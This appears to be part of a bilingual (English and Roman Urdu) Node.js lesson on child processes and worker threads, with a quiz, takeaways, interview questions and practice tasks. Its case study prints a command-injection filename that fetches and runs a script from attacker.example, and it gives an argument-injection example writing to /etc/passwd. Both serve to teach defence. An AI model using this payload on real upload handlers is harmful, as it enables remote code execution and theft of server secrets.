+<Option correct>With postMessage, which copies the data (structured clone)</Option>
+<Option>Through the file system only</Option>
+<Explanation>SharedArrayBuffer is the exception for explicitly shared memory.</Explanation>
+</Question>
+<Question q="Should you start a new worker for every request?">
+<Option>Yes, it's the fastest way</Option>
+<Option correct>No, use a fixed-size pool sized to the CPU cores</Option>
+<Option>Only for GET requests</Option>
+<Explanation>Too many workers waste memory and don't add CPU capacity.</Explanation>
+</Question>
+</Quiz>
+
+## Remember
+
+<Takeaways>
+<Tr>
+<En>
+
+- **Child processes** run other programs: `execFile` (collect output), `spawn` (stream output), `fork` (Node script with messages).
+- **Never** build shell commands from user input; use argument arrays, validation and `--`. Avoid `exec` and `shell: true` with untrusted data.
+- Set **timeouts**, handle `error` and non-zero exit codes, stop children on shutdown.
+- **Worker threads** run CPU-heavy JavaScript off the main thread and can use several cores; use a **pool** sized to `availableParallelism()`.
+- Messages are **copied** (structured clone); transfer or share buffers for big data.
+- Don't use workers for I/O; async code already handles waiting well.
+
+</En>
+<Ur>
+
+- **Child processes** doosre programs chalate hain: `execFile` (output jama), `spawn` (output stream), `fork` (messages wala Node script).
+- User input se shell commands **kabhi** na banayen; argument arrays, validation aur `--` lein. Na bharosemand data ke saath `exec` aur `shell: true` se bachein.
+- **Timeouts** lagayen, `error` aur ghair sifar exit codes sambhalein, shutdown par children band karein.
+- **Worker threads** CPU wala bhaari JavaScript main thread se hata kar chalate hain aur kai cores istemal kar sakte hain; `availableParallelism()` ke size ka **pool** lein.
+- Messages **copy** hote hain (structured clone); bare data ke liye buffers transfer ya share karein.
+- I/O ke liye workers na lein; async code intezar achhi tarah sambhalta hai.
+
+</Ur>
+</Tr>
+</Takeaways>
+
+## Go deeper
+
+<Tr>
+<En>
+The sections below are for when you're comfortable with the basics, or getting ready for interviews.
+</En>
+<Ur>
+Neeche ke hisse tab ke liye hain jab basics achi tarah samajh aa jayen, ya interview ki tayyari ho.
+</Ur>
+</Tr>
+
+<DeepDive title="More about processes and threads">
+
+**`stdio` options.** `spawn(cmd, args, { stdio: "inherit" })` lets the child print straight to your terminal (useful in CLI tools); `"ignore"` discards output; `"pipe"` (default) gives you streams.
+
+**Detached processes.** `{ detached: true }` plus `child.unref()` lets a child keep running after the parent exits, for background daemons.
+
+**Signals.** `child.kill("SIGTERM")` asks politely; `SIGKILL` forces. On Windows signals are emulated.
+
+**AbortController.** Both `execFile` and `spawn` accept `{ signal }`, so you can cancel a child when the HTTP request that started it is aborted.
+
+**cluster vs workers.** `node:cluster` forks several copies of a server sharing one port (each a full process); worker threads share one process and are for computation. In containers, it's usually simpler to run one Node process per container and scale containers.
+
+**Worker limits.** Each worker has its own V8 heap and event loop; set `resourceLimits` (`maxOldGenerationSizeMb`) to cap memory. Workers can't access the DOM (there isn't one) but can use most Node APIs, including `fs` and `fetch`.
+
+**Native threading in libraries.** Some libraries (sharp, bcrypt, Argon2 bindings) already do their heavy work on libuv's thread pool, so calling their async API doesn't block the event loop.
+
+</DeepDive>
+
+<DeepDive title="Real world: the thumbnail service that got hacked">
+
+A photo-sharing startup generated thumbnails by calling ImageMagick from its Node.js API: ``exec(`convert ${file} -thumbnail 200 ${out}`)``, where `file` was the original upload name, lightly cleaned by removing spaces.
+
+A researcher uploaded a file named `x.jpg;curl${IFS}attacker.example/s|sh;.jpg`. The shell expanded `${IFS}` to a space, downloaded a script and ran it with the API server's permissions. The script read environment variables, which included the database password and cloud credentials.
+
+The incident response rotated every secret and rebuilt the servers. The code fixes:
+
+1. Upload names were never used for anything on disk; files were stored under random UUIDs.
+2. `exec` was replaced with `execFile("convert", [inputPath, "-thumbnail", "200", outputPath])`, with a 15-second timeout.
+3. Thumbnailing moved out of the API process into a separate worker service running as a low-privilege user in a minimal container with no secrets in its environment.
+4. Later they replaced ImageMagick with the `sharp` library, avoiding a child process entirely, and added an ESLint rule forbidding `child_process.exec`.
+
+The same pattern (user data inside a shell string) is behind many critical vulnerabilities in tools far bigger than this startup.
+
+</DeepDive>
+
+<DeepDive title="Security lens">
+
+- **Command injection** is critical: no user data in shell strings; use `execFile`/`spawn` with argument arrays, allowlist validation and `--` before user-supplied values.
+- **Argument injection**: even without a shell, a value starting with `-` can become an option (`git log --output=/etc/passwd`); validate and use `--`.
+- **Least privilege**: run helper processes as unprivileged users, in containers, with only the environment variables they need (`env: { PATH: process.env.PATH }`).
+- **Resource limits**: timeouts, `maxBuffer`, worker memory limits and a bounded pool prevent denial of service.
+- **PATH hijacking**: use absolute paths for critical binaries in sensitive environments.
+- **Untrusted code**: worker threads and `node:vm` are **not** security sandboxes; run untrusted code in isolated processes or containers.
+
+</DeepDive>
+
+<DeepDive title="Interview questions">
+
+<QA q="What's the difference between exec, execFile, spawn and fork?">
+exec runs a command string through a shell and buffers output. execFile runs a program directly with an argument array and buffers output. spawn runs a program and exposes stdout and stderr as streams, suitable for large or long-running output. fork spawns a new Node.js process with an IPC channel for sending messages.
+</QA>
+
+<QA q="How do you prevent command injection in Node.js?">
+Avoid shells: use execFile or spawn with arguments as an array and without shell true, validate inputs against strict allowlists, use double dash before user-provided values, avoid passing user input as command names, and run processes with least privilege and timeouts.
+</QA>
+
+<QA q="When would you use worker threads?">
+For CPU-intensive JavaScript such as parsing, compression, image or data processing and complex calculations, so the main event loop stays responsive and multiple cores can be used. They aren't useful for I/O-bound work, which is already non-blocking.
+</QA>
+
+<QA q="How is data shared between worker threads?">
+By message passing with postMessage, which copies data using the structured clone algorithm; ArrayBuffers can be transferred without copying, and SharedArrayBuffer with Atomics allows truly shared memory with explicit synchronisation.
+</QA>
+
+<QA q="What's the difference between the cluster module and worker threads?">
+cluster forks multiple processes, each running a full copy of the server and sharing a listening port, to scale request handling across cores with isolated memory. Worker threads run inside one process with separate V8 isolates, intended for offloading computation, with cheaper communication but no process isolation.
+</QA>
+
+</DeepDive>
+
+<DeepDive title="All key terms">
+
+<Terms>
+  <Term name="Child process">A process started by another process.</Term>
+  <Term name="execFile">Runs a program with an argument array and collects its output.</Term>
+  <Term name="spawn">Runs a program and streams its output.</Term>
+  <Term name="fork">Starts a Node.js script with an IPC channel.</Term>
+  <Term name="exec">Runs a command string through a shell.</Term>
+  <Term name="Shell">A command interpreter such as sh or bash.</Term>
+  <Term name="Command injection">Running unintended commands through unsafe input.</Term>
+  <Term name="Exit code">The number a process returns when it ends.</Term>
+  <Term name="IPC">Communication between processes.</Term>
+  <Term name="Worker thread">A thread running JavaScript with its own event loop.</Term>
+  <Term name="workerData">Initial data passed to a worker.</Term>
+  <Term name="postMessage">Sends a message between threads or processes.</Term>
+  <Term name="Structured clone">The algorithm that copies message data.</Term>
+  <Term name="Worker pool">A reusable fixed set of workers for many tasks.</Term>
+  <Term name="availableParallelism">The number of CPU cores the process can use.</Term>
+</Terms>
+
+</DeepDive>
+
+<DeepDive title="More practice">
+
+1. Write a script that runs `npm outdated --json` with `execFile` and prints package names that have a newer major version.
+2. Stream the output of a long command (`ping -c 5 localhost`) to the terminal and to a log file at the same time.
+3. Add an `AbortController` so an HTTP request's cancellation kills its child process.
+4. Move a CPU-heavy function in one of your projects into a Piscina pool and measure event loop lag before and after.
+5. Search a codebase for `exec(` and check every call for user-controlled input.
+6. Fork three child processes and distribute 30 jobs between them with messages.
+
+</DeepDive>
+
+Next: **Debugging Node.js**: the inspector, breakpoints in VS Code and Chrome DevTools, CPU profiles, heap snapshots and finding memory leaks.
